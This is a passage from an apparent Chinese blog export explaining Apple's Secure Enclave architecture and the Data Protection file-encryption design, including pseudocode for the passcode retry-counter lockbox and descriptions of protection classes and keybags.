引擎之外，还有一个位于安全隔区边界外的 AES256 加密引擎，专门用于处理安全隔区和NAND (非易失性) 闪存之间的加密数据传输</li>\n<li>在 A9 之后，闪存子系统位于隔离的总线上，该总线被授权只能通过 DMA 加密引擎访问包含用户数据的内存，因此必须为安全隔区设置该专用 AES 加密引擎</li>\n<li>启动时，sepOS 会使用 TRNG 生成一个临时封装密钥，安全隔区使用<strong>专用线路</strong>将此密钥传输到 AES 引擎，旨在防止它被安全隔区外的任何软件访问；随后， sepOS 使用临时封装密钥来封装文件密钥，供应用程序处理器文件系统驱动程序使用，当文件系统驱动程序读取或写入文件时，它会将封装的密钥发送到 AES 引擎 以解封密钥。 AES 引擎绝不会将未封装的密钥透露给软件。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/aes-engine.png\" alt=\"AES-Engine\"></li>\n</ul>\n<h3 id=\"6-神经网络引擎（Secure-Neural-Engine）\"><a href=\"#6-神经网络引擎（Secure-Neural-Engine）\" class=\"headerlink\" title=\"6. 神经网络引擎（Secure Neural Engine）\"></a>6. 神经网络引擎（Secure Neural Engine）</h3><ul>\n<li>在配备 Face ID 的设备上，安全神经网络引擎将 2D 图像和深度图转化为用户脸部的数学表达式（不是原始图像，仅包含特征值）</li>\n<li>从 A11 开始，安全神经网络引擎已集成到安全隔区中。安全神经网络引擎采用直接内存访问 (DMA) 以实现高性能。由 sepOS 内核控制的输入输出内存管理单元 (IOMMU) 将此直接访问的范围限制在经授权的内存区域。</li>\n<li>从 A14 和 M1 开始，安全神经网络引擎在应用程序处理器的神经网络引擎中作为安全模式实现。 一个专用的硬件安全性控制器会在应用程序处理器和安全隔区的任务间切换，每次转换时神经网络引擎状态均会被重设以保持面容 ID 数据的安全。 一个专用的引擎会应用内存加密、 认证和访问控制。 同时，它使用单独的加密密钥和内存范围，以将安全神经网络引擎限制在经授权的内存区域。</li>\n</ul>\n<blockquote>\n<p>也就是说，安全神经网络引擎改为虚拟化方案，不再是独立的协处理器哦</p>\n</blockquote>\n<h3 id=\"7-功耗和时钟监视器（Power-and-clock-monitors）\"><a href=\"#7-功耗和时钟监视器（Power-and-clock-monitors）\" class=\"headerlink\" title=\"7. 功耗和时钟监视器（Power and clock monitors）\"></a>7. 功耗和时钟监视器（Power and clock monitors）</h3><ul>\n<li>所有的电子设备都被设计为在一定的电压和频率包络内运行。如果在此包络外运行，电子设备可能会发生故障，然后安全性控制就可能被绕过</li>\n<li>为了帮助确保电压和频率保持在安全的范围内，安全隔区中设计了监视电路</li>\n<li>这些监视电路被设计为具有比安全隔区其余部分更大的运行包络。如果监视器检测到非法运行点，安全隔区中的时钟会自动停止，在下一次 SoC 重设前不会重新开始运行。</li>\n</ul>\n<h2 id=\"五、几个问题的讨论\"><a href=\"#五、几个问题的讨论\" class=\"headerlink\" title=\"五、几个问题的讨论\"></a>五、几个问题的讨论</h2><h3 id=\"1-Apple-Secure-Enclave-的技术实现是虚拟化方案，还是协处理器方案？\"><a href=\"#1-Apple-Secure-Enclave-的技术实现是虚拟化方案，还是协处理器方案？\" class=\"headerlink\" title=\"1. Apple Secure Enclave 的技术实现是虚拟化方案，还是协处理器方案？\"></a>1. Apple Secure Enclave 的技术实现是虚拟化方案，还是协处理器方案？</h3><p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/apple-M1.png\" alt=\"M1\"></p>\n<p>由于Mac电脑原来采用Intel芯片，因此Apple发展了T系列安全芯片解决安全问题，显然这是一个独立芯片的方案，而随着Apple自研的M系列CPU的出现，安全隔区已经被整合到CPU芯片之中。<br>而从iPhone手机的角度看，A系列CPU都是基于ARM指令集，虚拟化方案和协处理器方案都可以满足TrustZone架构的技术要求，从外部功能提供上无法区别，主要差别就是设计复杂度和成本问题。</p>\n<p>从Apple提供的安全性文档中的描述推测，Secure Enclave 采用了协处理器方案，请看关于SCIP的描述。</p>\n<blockquote>\n<p>Coprocessor firmware handles many critical system tasks—for example, the Secure Enclave, the image sensor processor, and the motion coprocessor. Therefore its security is a key part of the security of the overall system. To prevent modification of coprocessor firmware, Apple uses a mechanism called System Coprocessor Integrity Protection (SCIP).</p>\n</blockquote>\n<p>但是也有例外，安全神经网络引擎原本是安全隔区的一个组件，但从 A14 开始，调整为应用处理器中神经网络引擎的安全模式，也就是虚拟化方案。考虑到神经网络引擎的专用性，这应该是更有效率的选择。</p>\n<blockquote>\n<p>Starting with A14 and the M1 family, the Secure Neural Engine is implemented as a secure mode in the Application Processor’s Neural Engine. A dedicated hardware security controller switches between Application Processor and Secure Enclave tasks, resetting Neural Engine state on each transition to keep Face ID data secure. A dedicated engine applies memory encryption, authentication, and access control. At the same time, it uses a separate cryptographic key and memory range to limit the Secure Neural Engine to authorized memory regions.</p>\n</blockquote>\n<h3 id=\"2-如何确保-Secure-Enclave-外部接口的安全性？\"><a href=\"#2-如何确保-Secure-Enclave-外部接口的安全性？\" class=\"headerlink\" title=\"2. 如何确保 Secure Enclave 外部接口的安全性？\"></a>2. 如何确保 Secure Enclave 外部接口的安全性？</h3><p>Secure Enclave 虽然是安全世界，但要正常工作就必须与外部世界发生数据交换，因此外部接口的边界安全防护是重点，必须全面、可靠。</p>\n<ul>\n<li>RAM：共享，使用主处理器的内存硬件资源，但通过安全内存保护引擎实现加密和认证</li>\n<li>ROM：专用，安全隔区有自己的Boot ROM，并完全固化在内部</li>\n<li>NAND（闪存）：可访问，安全隔区可以访问系统NAND资源，但通过专用AES引擎实现加密保护</li>\n<li>安全非易失性存储：专用，存储各类密钥、熵源、计数器和指纹特征等用户敏感数据，通过专用I2C总线连接</li>\n<li>UID &amp; GID：制造过程中通过E-Fuse固化</li>\n</ul>\n<h3 id=\"3-Apple设备中Secure-Equipment和Secure-Enclave的关系是什么？\"><a href=\"#3-Apple设备中Secure-Equipment和Secure-Enclave的关系是什么？\" class=\"headerlink\" title=\"3. Apple设备中Secure Equipment和Secure Enclave的关系是什么？\"></a>3. Apple设备中Secure Equipment和Secure Enclave的关系是什么？</h3><p>以Apple Pay的支付授权为例，</p>\n<p>安全元件是运行 Java Card 平台的认证芯片，符合金融行业对电子支付的要求，由 EMVCo 提供安全认证。</p>\n<blockquote>\n<p>The Secure Element is an industry-standard, certified chip running the Java Card platform, which is compliant with financial industry requirements for electronic payments. The Secure Element IC and the Java Card platform are certified in accordance with the EMVCo Security Evaluation process. After the successful completion of the security evaluation, EMVCo issues unique IC and platform certificates.</p>\n</blockquote>\n<p>安全元件负责管理支付网络或发卡机构认证的Applet，业务密钥储存在Applet内，由SE的安全域提供保护。</p>\n<blockquote>\n<p>The Secure Element hosts a specially designed applet to manage Apple Pay. It also includes applets certified by payment networks or card issuers. Credit, debit, or prepaid card data is sent from the payment network or card issuer encrypted to these applets using keys that are known only to the payment network or card issuer and the applets’ security domain. This data is stored within these applets and protected using the Secure Element’s security features. During a transaction, the terminal communicates directly with the Secure Element through the near-field-communication (NFC) controller over a dedicated hardware bus.</p>\n</blockquote>\n<p>安全隔区负责为Apple Pay的支付业务提供用户层面（基于Face ID、TouchID 和 Passcode等）的授权，而不涉及金融机构的鉴权或风险控制。<br>在添加或移除 Apple Pay 卡片时，安全隔区的介入也是这一逻辑的体现。</p>\n<blockquote>\n<p>On iPhone, iPad, Apple Watch, Mac computers with Touch ID, and Mac computers with Apple silicon that use the Magic Keyboard with Touch ID, the Secure Enclave manages the authentication process and allows a payment transaction to proceed.</p>\n</blockquote>\n<hr>\n<h2 id=\"附录一：Apple自研芯片的安全隔区特性\"><a href=\"#附录一：Apple自研芯片的安全隔区特性\" class=\"headerlink\" title=\"附录一：Apple自研芯片的安全隔区特性\"></a>附录一：Apple自研芯片的安全隔区特性</h2><p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/list.png\" alt=\"List\"></p>\n<h2 id=\"附录二：Apple自研芯片的分类\"><a href=\"#附录二：Apple自研芯片的分类\" class=\"headerlink\" title=\"附录二：Apple自研芯片的分类\"></a>附录二：Apple自研芯片的分类</h2><h3 id=\"1、主处理器芯片\"><a href=\"#1、主处理器芯片\" class=\"headerlink\" title=\"1、主处理器芯片\"></a>1、主处理器芯片</h3><ul>\n<li>A系列：智能终端的iOS，使用于iPhone、iPad、iPod touch、Apple TV及Studio Display产品线。从A4开始，最新型号是 iPhone 13 搭载的 A15</li>\n<li>S系列：可穿戴设备的Watch OS，使用于Apple Watch和HomePod Mini产品线，最新型号是S7</li>\n<li>M系列：生产力工具的Mac OS，使用于Mac OS的笔记本电脑和台式机，基于ARM架构的自研处理器，包括M1、M2等</li>\n</ul>\n<h3 id=\"2、功能芯片\"><a href=\"#2、功能芯片\" class=\"headerlink\" title=\"2、功能芯片\"></a>2、功能芯片</h3><ul>\n<li>H（W）系列：音频芯片，用于Airpods耳机，2016首发W1芯片，后续还有W2、W3；AirPods第二代之后被更名为H系列</li>\n<li>U系列：定位芯片，用于UWB（ultra-wide band）精确定位的芯片，替代已被放弃的基于低功耗蓝牙BLE的iBeacons技术，2019年首次出现在iPhone 11，AirTag标签也使用U1</li>\n<li>T系列：已下线。用于基于Intel芯片的Mac电脑的安全芯片，包括T1和T2，该系列已停止并整合进M系列</li>\n</ul>\n<h2 id=\"附录三：第二代安全存储组件的计数器加密箱的工作原理\"><a href=\"#附录三：第二代安全存储组件的计数器加密箱的工作原理\" class=\"headerlink\" title=\"附录三：第二代安全存储组件的计数器加密箱的工作原理\"></a>附录三：第二代安全存储组件的计数器加密箱的工作原理</h2><p>2020年10月，苹果突然发布了第二代安全存储组件，并紧急升级 A12、A13 以及 S5 芯片，据认为 GrayKey 密码破解设备有关系，其采用暴力破解方式实现iPhone解锁。</p>\n<p>第二代安全储存组件增加了计数器加密箱，包括：1个128位盐，1个128位密码验证器，1个8位计数器，1个 8 位最大尝试值，其工作原理如下：</p>\n<h3 id=\"1-创建阶段\"><a href=\"#1-创建阶段\" class=\"headerlink\" title=\"1. 创建阶段\"></a>1. 创建阶段</h3><ul>\n<li><p>安全隔区：<br>  发送数据：密码熵值（passcodeEntropyValue），最大重试次数（maxRetryTimes）<br>  接受数据：密码箱熵值（lockboxEntropyValue）</p>\n</li>\n<li><p>安全存储组件：<br>  自有数据：安全存储组件的唯一加密密钥（SSCKey）<br>  处理流程伪代码：</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">saltValue = <span class=\"title function_\">random</span>(); <span class=\"comment\">// 使用随机数生成器生成盐值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 利用提供的密码熵值、安全存储组件的唯一加密密钥和盐值中导出密码验证器值和密码箱熵值</span></span><br><span class=\"line\">(passcodeVerifierValue, lockboxEntropyValue) = <span class=\"title function_\">func</span>(passcodeEntropyValue, <span class=\"title class_\">SSCKey</span>, saltValue)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 初始化计数器密码箱</span></span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span> = <span class=\"number\">0</span>；</span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">maxRetryTimes</span> = maxRetryTimes; </span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">passcodeVerifierValue</span> = passcodeVerifierValue;  <span class=\"comment\">// 保存密码验证器值</span></span><br><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">saltValue</span> = saltValue;                          <span class=\"comment\">// 保存盐值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> lockboxEntropyValue； <span class=\"comment\">// 向安全隔区返回密码箱熵值</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-验证阶段\"><a href=\"#2-验证阶段\" class=\"headerlink\" title=\"2. 验证阶段\"></a>2. 验证阶段</h3><ul>\n<li><p>安全隔区：<br>  发送数据：密码熵值（passcodeEntropyValue）<br>  接受数据：密码箱熵值（lockboxEntropyValue）</p>\n</li>\n<li><p>安全存储组件：<br>  自有数据：安全存储组件的唯一加密密钥（SSCKey），密码箱(SSC)<br>  处理流程伪代码：</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span>++; <span class=\"comment\">// 首先增加密码箱的计数器</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span> &gt; <span class=\"variable constant_\">SSC</span>.<span class=\"property\">maxRetryTimes</span> &#123;  <span class=\"comment\">// 检查递增的计数器是否超过最大尝试值</span></span><br><span class=\"line\">    <span class=\"title function_\">reset</span>(<span class=\"variable constant_\">SSC</span>);</span><br><span class=\"line\">    exit -<span class=\"number\">1</span> ; <span class=\"comment\">// 疑似重复攻击，完全清除计数器密码箱并异常退出</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 尝试使用用于创建计数器密码箱的相同算法导出密码验证器值和密码箱熵值</span></span><br><span class=\"line\">    (passcodeVerifierValue, lockboxEntropyValue) = <span class=\"title function_\">func</span>(passcodeEntropyValue, <span class=\"title class_\">SSCKey</span>, <span class=\"variable constant_\">SSC</span>.<span class=\"property\">saltValue</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> passcodeVerifierValu == <span class=\"variable constant_\">SSC</span>.<span class=\"property\">passcodeVerifierValue</span> &#123;</span><br><span class=\"line\">        <span class=\"variable constant_\">SSC</span>.<span class=\"property\">count</span> = <span class=\"number\">0</span>;               </span><br><span class=\"line\">        <span class=\"keyword\">return</span> lockboxEntropyValue; <span class=\"comment\">// 向安全隔区返回密码箱熵值并重置计数器</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;               <span class=\"comment\">// 校验不成功，返回错误</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>值得关注的是：</p>\n<ol>\n<li>加密过程使用了3个因子，<code>passcodeEntropyValue</code>由安全隔区提供，2个内部因子<code>SSCKey</code>和<code>saltValue</code>只在内部保存，因此传输是安全的</li>\n<li>安全存储组件持久化存储的不是<code>passcodeEntropyValue</code>的原始值，而是不可逆的校验值<code>passcodeVerifierValue</code>，可以防止反向获得加密因子</li>\n<li>安全存储组件的唯一加密密钥<code>SSCKey</code>是个什么东西？估计是<code>UID</code>派生出来的一个专用密钥，在安全存储组件内部全局有效</li>\n<li>向安全隔区返回密码箱熵值（而非简单的是否），具备了双向认证的基础，但是否如此没有证据！</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h3><ul>\n<li><a href=\"apple-platform-security-guide.pdf\">Apple平台安全白皮书 - 2022英文版</a></li>\n<li><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">Apple平台安全白皮书 - 2021中文版</a></li>\n<li><a href=\"iOS%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2018%E8%8B%B1%E6%96%87%E7%89%88.pdf\">iOS安全白皮书 - 2018英文版</a></li>\n</ul>\n<h3 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h3><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/441603311\">苹果iOS系统安全调研</a></li>\n<li><a href=\"https://github.com/YuZhang/Security-Courseware/blob/master/system-security/ios-security.md\">iOS安全体系结构的简要分析</a></li>\n<li><a href=\"https://bbs.pediy.com/thread-260399.htm\">基于 ARM TrustZone 的 Secure Boot 实现</a></li>\n<li><a href=\"https://www.synopsys.com/zh-cn/china/resources/dwtb/dwtb-cn-q1-21018-rootsoftrusts.html\">了解硬件信任根 - 新思公司</a></li>\n<li><a href=\"https://www.beanpodtech.com/%E5%85%B3%E4%BA%8Eapple-pay%E5%8D%81%E4%BA%94%E4%B8%AA%E6%8A%80%E6%9C%AF%E9%97%AE%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/\">关于Apple Pay十五个技术问题</a></li>\n<li><a href=\"https://picture.iczhiku.com/weixin/message1610684573974.html\">MCU 芯片加密历程</a></li>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-4-secure-random-generators/\">写给开发人员的实用密码学（四）—— 安全随机数生成器 CSPRNG</a></li>\n</ul>\n<h3 id=\"安全漏洞\"><a href=\"#安全漏洞\" class=\"headerlink\" title=\"安全漏洞\"></a>安全漏洞</h3><ul>\n<li><a href=\"https://mrmad.com.tw/secure-enclave-security-chip-explodes-hardware-vulnerabilities\">蘋果Secure Enclave安全晶片爆硬體漏洞，舊款設備無法修復</a></li>\n<li><a href=\"https://www.bilibili.com/read/cv9849473/\">iPhone史诗级DFU漏洞分析</a></li>\n<li><a href=\"https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/\">Checkm8 漏洞研究</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/84925896\">苹果超级大漏洞 BootROM 的说明及威胁评估</a></li>\n</ul>\n"},{"title":"Apple数据保护技术专题之一：基础架构","url":"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/","content":"<p>长期以来 Apple 公司有两条数据安全的技术演进路线，iPhone 和 iPad 等智能终端设备使用称为<strong>数据保护（Data Protection）</strong>的文件加密方法，基于Intel的Mac设备通过<strong>文件保险箱（FileVault）</strong>的宗卷加密技术。</p>\n<p>MacOS 和 iOS 都是基于 FreeBSD 发展而来，基础架构是一个多用户的操作系统，但 iPhone 等作为个人化（无需支持多用户）的终端设备，存储了通信录、照片等非常敏感的隐私数据，对数据保护的要求更高；其次，App Store 和 iCloud等云服务大量出现，在网络开放环境下既要支持便利的后台服务管理，又要解决数据迁移过程中的数据保护，对数据保护的技术方案提出了新要求；最后，跨平台的生态系统需要密切协同（例如多个不同设备之间需要共享邮箱账号和密码），需要解决服务协同与数据安全的矛盾。</p>\n<p>数据保护的技术实现离不开关键的硬件支持！限于技术演进和商业利益，早期的 Mac 设备基于 Intel CPU，早期的 iPhone 也采用 ARM6 和 ARM7 CPU，其底层架构难以满足数据保护的技术需求，为此 Apple 先后推出了适配 iPhone 的 A 系列 CPU 和适配 Mac 设备的 T 系列增强型安全芯片，依托自主研发的 Secure Encalve 为数据保护技术提供底层硬件支持，同时结合操作系统内核技术和 APP 沙盒技术等，确保只有受信任的代码及App可以在设备上运行（典型成果就是流行一时的 iPhone 越狱已经成为历史！），并有效提升了安全启动链、系统安全性和App安全性功能。</p>\n<p>随着 M1 自研芯片的推出，上述两条技术路线正在逐步融合，搭载 Apple 芯片的 Mac 设备已经使用两者的混合模型，相信未来 FileVault 技术将逐步退出，因此本文主要研究Data Protection 技术。根据Apple 官方文档，其主要设计目标包括：</p>\n<ul>\n<li>在硬件被改动的情况下也能保护数据（替换组件&#x2F;直接读取闪存等）</li>\n<li>对抗离线攻击（物理方式获取闪存内的数据后用更强大的计算设备进行破解）</li>\n<li>对不同的数据提供不同级别的保护（锁屏之后有些数据要保护，有些数据还需要访问）</li>\n<li>需要时能够快速安全清除所有数据</li>\n<li>考虑性能和功耗</li>\n</ul>\n<h2 id=\"一、文件数据保护\"><a href=\"#一、文件数据保护\" class=\"headerlink\" title=\"一、文件数据保护\"></a>一、文件数据保护</h2><p>iOS 的所有用户数据文件都是加密存储的，Mac的情况复杂一些，文件系统加密是可选的，但USB外接存储就没有必要了。主要设计思想是：</p>\n<ul>\n<li>每个文件创建时会生成一个<code>Per-file Key</code>，在文件写入闪存时通过硬件用<code>AES-XTS</code>加密</li>\n<li><code>Per-file Key</code>存储在文件的元数据 (Metadata) 中，被<code>Class Key</code>和<code>Filesystem Key</code>加密</li>\n<li><code>Class Key</code>和<code>Filesystem Key</code>都被硬件密钥<code>UID</code>保护</li>\n<li><code>Class Key</code>还被用户密码<code>Passcode</code>保护</li>\n</ul>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/KEY-ARCH.jpg\" alt=\"key\"></p>\n<blockquote>\n<p>EMF Key 就是加密封装的 Filesystem Key，存储在闪存的可擦除区域，只允许安全隔区访问<br>Class Key 通过多层加密封装，持久化存储在 keybag（系统密钥包）之中</p>\n</blockquote>\n<p>这种设计方案的主要优势在于：</p>\n<ol>\n<li>实现了“一件一密”，每个文件都有独立的密钥<code>Per-file Key</code>，加密强度大大提高</li>\n<li><code>Class Key</code>实现对文件不同级别的保护（最高级别只有在设备解锁状态下才可用），一个密钥就可以解封对应级别所有文件的<code>Per-file Key</code>；当用户修改<code>Passcode</code>时，只需重置<code>Class Key</code>并对元数据中的文件密钥重新封装即可，原始文件无需重新加密，兼顾了安全性和灵活性</li>\n<li><code>Filesystem Key</code>在 iOS 安装时或每次设备数据被清除时生成，其目标不是保护数据的机密性，而是用于实现快速清除数据，即一旦<code>Filesystem Key</code>被删除，设备上所有文件将永久无法解密</li>\n<li>所有加密处理由 AES Engine 的硬件处理，性能有保障；同时所有密钥由 Secure Enclave 统一管理，不对外泄露，确保安全性并对上层应用透明</li>\n<li>文件数据有<code>Class Key</code>和<code>Filesystem Key</code>两层密钥，并最终由<code>UID</code>和<code>Passcode</code>提供保护，考虑到用户设置<code>Passcode</code>的强度不高，Apple还专门强化了安全隔区的反重放机制以提高安全性</li>\n</ol>\n<blockquote>\n<p>When a file is opened, its metadata is decrypted with the file system key, revealing the wrapped per-file key and a notation on which class protects it. The per-file (or per-extent) key is unwrapped with the class key and then supplied to the hardware AES Engine, which decrypts the file as it’s read from flash storage. All wrapped file key handling occurs in the Secure Enclave; the file key is never directly exposed to the Application Processor.</p>\n</blockquote>\n<h2 id=\"二、数据保护等级\"><a href=\"#二、数据保护等级\" class=\"headerlink\" title=\"二、数据保护等级\"></a>二、数据保护等级</h2><p>设备中我们需要对不同的文件提供不同程度的保护。iOS 上每个文件创建时都会被指定一个级别，每个级别对应一个<code>Class Key</code>。</p>\n<h3 id=\"A类：完全保护，Complete-Protection\"><a href=\"#A类：完全保护，Complete-Protection\" class=\"headerlink\" title=\"A类：完全保护，Complete Protection\"></a>A类：完全保护，Complete Protection</h3><ul>\n<li>该类密钥通过从用户密码和设备 UID 派生的密钥得到保护。用户锁定设备后不久（如果 “需要密码” 设置为 “立即”，则为10秒钟），解密的类密钥会被丢弃，此类的所有数据都无法访问，除非用户再次输入密码或使用触控 ID 或面容 ID 解锁（登录）设备。</li>\n<li>在 macOS 中，上一个用户退出登录不久后，解密的类密钥会被丢弃，此类的所有数据都无法访问，直到某位用户再次输入密码或使用触控 ID 登录设备。</li>\n</ul>\n<h3 id=\"B类：未打开文件保护，Protected-Unless-Open\"><a href=\"#B类：未打开文件保护，Protected-Unless-Open\" class=\"headerlink\" title=\"B类：未打开文件保护，Protected Unless Open\"></a>B类：未打开文件保护，Protected Unless Open</h3><ul>\n<li>设备锁定或用户退出登录时，可能需要写入部分文件（如后台下载邮件附件）。此行为通过使用非对称椭圆曲线加密技术（基于 Curve25519 的 ECDH）实现。普通的文件独有密钥通过使用一次性迪菲-赫尔曼密钥交换协议（One-Pass Diffie-Hellman Key Agreement，如 NIST SP 800-56A 中所述）派生的密钥进行保护。</li>\n<li>该协议的临时公钥与封装的文件独有密钥一起储存。 KDF 是串联密钥导出函数 (Approved Alternative 1)，如 NIST SP 800-56A 中 5.8.1 所述。AlgorithmID 已忽略。 PartyUInfo 和 PartyVInfo 分别是临时公钥和静态公钥。SHA256 被用作哈希函数。一旦文件关闭，文件独有密钥就会从内存中擦除。要再次打开该文件，系统会使用 “未打开文件的保护” 类的私钥和文件的临时公钥重新创建共享密钥，用来解开文件独有密钥的封装，然后用文件独有密钥来解密文件。</li>\n<li>在 macOS 中，只要系统上的任何用户已登录或认证即可访问 NSFileProtectionCompleteUnlessOpen 的私有部分。</li>\n</ul>\n<h3 id=\"C类：首次用户认证前保护，Protected-Until-First-User-Authentication\"><a href=\"#C类：首次用户认证前保护，Protected-Until-First-User-Authentication\" class=\"headerlink\" title=\"C类：首次用户认证前保护，Protected Until First User Authentication\"></a>C类：首次用户认证前保护，Protected Until First User Authentication</h3><ul>\n<li>此类和 “全面保护” 类的行为方式相同，只不过在设备锁定或用户退出登录时已解密的类密钥不会从内存中删除。此类中的保护与桌面电脑全宗卷加密有类似的属性，可防止数据受到涉及重新启动的攻击。这是未分配给数据保护类的所有第三方 App 数据的默认类。</li>\n<li>在 macOS 中，此类的作用类似于文件保险箱，且使用只要宗卷装载即可访问的宗卷密钥。</li>\n</ul>\n<h3 id=\"D类：无保护，No-Protection\"><a href=\"#D类：无保护，No-Protection\" class=\"headerlink\" title=\"D类：无保护，No Protection\"></a>D类：无保护，No Protection</h3><ul>\n<li>此类密钥仅受 UID 的保护，并且存储在可擦除存储器中（即 DKey 密钥）。由于解密该类中的文件所需的所有密钥都储存在设备上，因此采用该类加密的唯一好处就是可以进行快速远程擦除。即使未向文件分配数据保护类，此文件仍会以加密形式储存 （就像 iOS 和 iPadOS 设备上的所有数据那样）。</li>\n<li>macOS 不支持该类型。</li>\n</ul>\n<blockquote>\n<p>The contents of a file may be encrypted with one or more per-file (or per-extent) keys that are wrapped with a class key and stored in a file‘s metadata, which in turn is encrypted with the file system key. The class key is protected with the hardware UID and, for some classes, the user’s passcode. This hierarchy provides both flexibility and performance. For example, <strong>changing a file‘s class only requires rewrapping its per-file key, and a change of passcode just rewraps the class key</strong>。</p>\n</blockquote>\n<h2 id=\"三、钥匙包（keyBag）数据保护\"><a href=\"#三、钥匙包（keyBag）数据保护\" class=\"headerlink\" title=\"三、钥匙包（keyBag）数据保护\"></a>三、钥匙包（keyBag）数据保护</h2><p>系统密钥包是一个加密的 <code>plist</code> 格式的二进制文件，存储了所有类密钥的数据，Apple 系统的数据解密实现方式见下图。</p>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/daemon.png\" alt=\"Daemon\"></p>\n<p>有五种不同类型的钥匙包，但数据格式完全相同，包括：</p>\n<h3 id=\"1-用户密钥包-User-keyBag\"><a href=\"#1-用户密钥包-User-keyBag\" class=\"headerlink\" title=\"1. 用户密钥包(User keyBag)\"></a>1. 用户密钥包(User keyBag)</h3><p>用户密钥包是设备常规操作中使用的封装类密钥的储存位置。例如，输入密码后，<code>NSFileProtectionComplete</code>会从用户密钥包中载入并解封。它是储存在“无保护”类中的二进制属性列表 (.plist) 文件。<br>对于搭载 A9 之前的 SoC 的设备，该 .plist 文件的内容通过保存在可擦除存储器中的密钥（Bag1 Key）加密。为了给密钥包提供前向安全性，用户每次更改密码时，系统都会擦除并重新生成此密钥。<br>对于搭载 A9 或后续型号 SoC 的设备，该 .plist 文件包含一个密钥，表示密钥包储存在受反重放随机数（由安全隔区控制）保护的有锁储存库中。</p>\n<h3 id=\"2-设备密钥包-Device-keyBag\"><a href=\"#2-设备密钥包-Device-keyBag\" class=\"headerlink\" title=\"2. 设备密钥包 (Device keyBag)\"></a>2. 设备密钥包 (Device keyBag)</h3><p>设备密钥包用来储存用于涉及设备特定操作数据的封装类密钥。 配置为共用的 iPadOS 设备有时需要在用户登录前访问凭证，因此需要一个不受用户密码保护的密钥包。<br>iOS 和 iPadOS 不支持对用户独有的文件系统内容进行单独加密，这就意味着系统使用来自设备密钥包的类密钥，对文件独有密钥进行封装，而钥匙串则使用来自用户密钥包中的类密钥来保护用户钥匙串中的项目。<br>在配置为单用户使用 (默认配置) 的 iOS 和 iPadOS 设备中， 设备密钥包和用户密钥包是同一个， 并受用户的密码保护。</p>\n<h3 id=\"3-备份密钥包（Backup-keyBag）\"><a href=\"#3-备份密钥包（Backup-keyBag）\" class=\"headerlink\" title=\"3. 备份密钥包（Backup keyBag）\"></a>3. 备份密钥包（Backup keyBag）</h3><p>备份密钥包在 “访达” (macOS 10.15 或更高版本) 或 iTunes (macOS 10.14 或更低版本) 进行加密备份时创建，并储存在设备被备份到的电脑中。<br>新密钥包是通过一组新密钥创建的，备份的数据会使用这些新密钥重新加密。 如前所述，不可迁移钥匙串项仍使用 UID 派生密钥封装，以使其可以恢复到最初备份它们的设备，但在其他设备上不可访问。<br>由于备份密钥包并未捆绑特定设备， 理论上尝试在多台电脑上对备份密钥包并行展开暴力破解是可行的。<br>如果用户选择不加密备份， 